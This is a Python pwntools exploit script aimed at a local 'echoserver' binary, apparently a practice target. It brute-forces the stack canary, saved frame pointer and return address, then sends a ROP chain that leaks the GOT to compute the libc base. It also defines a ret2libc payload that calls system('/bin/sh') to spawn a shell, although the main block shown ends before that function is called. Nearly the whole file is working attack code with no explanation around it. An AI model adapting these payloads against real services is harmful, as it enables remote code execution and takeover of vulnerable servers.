#!/usr/bin/env python3

import os
from pwn import *
from leakmod import leak


def leak_stack():
    padding = b'A' * 264
    # Canary is after vulnerable buffer and other variables on the stack
    canary = leak(padding, delay=0.07)
    log.success(
        f'''
        ##################################
        Canary: 0x{canary[::-1].hex()}
        ##################################
        ''')

    p = log.progress('Wait for connections to close')
    for i in range(10, 0, -1):
        p.status(f'waiting ({i} seconds left)')
        sleep(1)
    p.success()

    padding += canary
    # Saved frame base pointer is after buffer, variables and canary on the stack
    savedframeptr = leak(padding, 'saved frame pointer', delay=0.07)
    log.success(
        f'''
        ##################################
        SFP: 0x{savedframeptr[::-1].hex()}
        ##################################
        ''')

    p = log.progress('Wait for connections to close')
    for i in range(10, 0, -1):
        p.status(f'waiting ({i} seconds left)')
        sleep(1)
    p.success()

    padding += savedframeptr
    # Return address / return instruction pointer is after buffer, variables, canary and SFP on the stack
    retaddr = leak(padding, 'return address', delay=0.07)
    log.success(
        f'''
        ##################################
        Return address: 0x{retaddr[::-1].hex()}
        ##################################
        ''')

    return (canary, savedframeptr, retaddr)


def leak_got(bin_base=b'', canary=b'', sfp=b'', poprsi_offset=0x1601, got_offset=0x3f38, write_offset=0x1574):
    # Address of pop rsi; pop r15; ret (default: offset 0x1601 from base)
    poprsi_addr = p64(u64(bin_base) + poprsi_offset)
    # Address of the GOT (default: offset 0x3f38 from base)
    got_addr = p64(u64(bin_base) + got_offset)
    # Address of write instruction in main loop (default: offset 0x1574 from base)
    write_addr = p64(u64(bin_base) + write_offset)

    payload = b''
    payload += b'A' * 264       # Padding
    payload += canary           # Stack canary
    payload += sfp              # Saved frame pointer
    payload += poprsi_addr      # pop rsi; pop r15; ret address
    payload += got_addr         # GOT address to pop into rsi
    payload += p64(0x0)         # Junk to pop into r15
    payload += write_addr       # Write instruction to return to (destination file descriptor set in echo, number of bytes set in echo)

    # Send payload to echoserver and wait for reply
    r = remote('localhost', 2323)
    r.send(payload)
    reply = r.recvall()

    return reply

def spawn_shell(bin_base=b'', libc_base=b'', canary=b'', sfp=b'', poprdi_offset=0x1603, ret_offset=0x101a, system_offset=0x55410, binsh_offset=0x1b75aa):
    # Address of system function
    system_addr = p64(u64(libc_base) + system_offset)
    log.info(f'system() is loaded at 0x{system_addr[::-1].hex()}')

    # Address of ret instruction
    ret_addr = p64(u64(bin_base) + ret_offset)
    log.info(f'ret instruction is loaded at 0x{ret_addr[::-1].hex()}')

    # Address of "/bin/sh" string in libc
    binsh_addr = p64(u64(libc_base) + binsh_offset)
    log.info(f'"/bin/sh" string is loaded at 0x{binsh_addr[::-1].hex()}')

    # Address of pop rdi; ret instructions
    poprdi_addr = p64(u64(bin_base) + poprdi_offset)
    log.info(f'pop rdi; ret instructions are loaded at 0x{poprdi_addr[::-1].hex()}')

    payload = b''
    payload += b'A' * 264       # Padding
    payload += canary           # Stack canary
    payload += sfp              # Saved frame pointer
    payload += ret_addr         # ret address
    payload += poprdi_addr      # pop rdi; ret address
    payload += binsh_addr       # "/bin/sh" address
    payload += system_addr      # system() address

    r = remote('localhost', 2323)
    r.send(payload)
    r.close()


def hexdump(bin_data, skip=0):
    hexstring = ''

    try:
        for i in range(skip, len(bin_data), 16):
            hexstring += f'{i:08x}  '
            tmp = ' '.join([f'{j:02x}' for j in bin_data[i:i + 16]])
            tmp = tmp[0:23] + ' ' + tmp[23:]
            hexstring += tmp
            hexstring += '\n'
    except:
        pass

    return hexstring


if __name__ == '__main__':
    # Load binary and libc
    binary = ELF('./echoserver')
    libc = binary.libc

    # context.log_level = 'debug'
    if os.path.isfile('./cache.bin'):
        # Read values from binary cache file
        with open('./cache.bin', 'rb') as f:
            canary = f.read(8)
            sfp = f.read(8)
            rip = f.read(8)
            log.success('Read values from local cache file')
    else:
        # Determine values by brute force leaking
        (canary, sfp, rip) = leak_stack()
        with open('./cache.bin', 'wb') as f:
            f.write(canary)
            f.write(sfp)
            f.write(rip)

    log.success(
        f'Found canary 0x{canary[::-1].hex()}, saved frame pointer 0x{sfp[::-1].hex()} and return address 0x{rip[::-1].hex()}')

    # Base address at which the binary is loaded into memory (substracting the instruction offset from the leaked return address)
    bin_base = p64(u64(rip) - 0x1563)

    got_offset = binary.get_section_by_name('.got').header['sh_addr']
    log.info(
        f'ELF loaded at base address 0x{bin_base[::-1].hex()}, GOT at offset 0x{p64(got_offset)[::-1].hex()}')

    got_data = leak_got(bin_base=bin_base, canary=canary,
                        sfp=sfp, got_offset=got_offset)
    if len(got_data) > 0:
        log.success('Leaked GOT from binary')
    else:
        log.error('Failed leaking GOT from binary')
    # Output reply (including leaked GOT) in hexdump format
    log.info(hexdump(got_data, skip=2))

    # Extract libc address of write from leaked GOT
    write_addr = got_data[0x15a:0x162]
    log.info(f'write() is loaded at 0x{write_addr[::-1].hex()}')

    # Calculate libc base address with write address and write offset
    libc_base = p64(u64(write_addr) - libc.symbols['write'])
    log.info(f'libc is loaded at 0x{libc_base[::-1].hex()}')
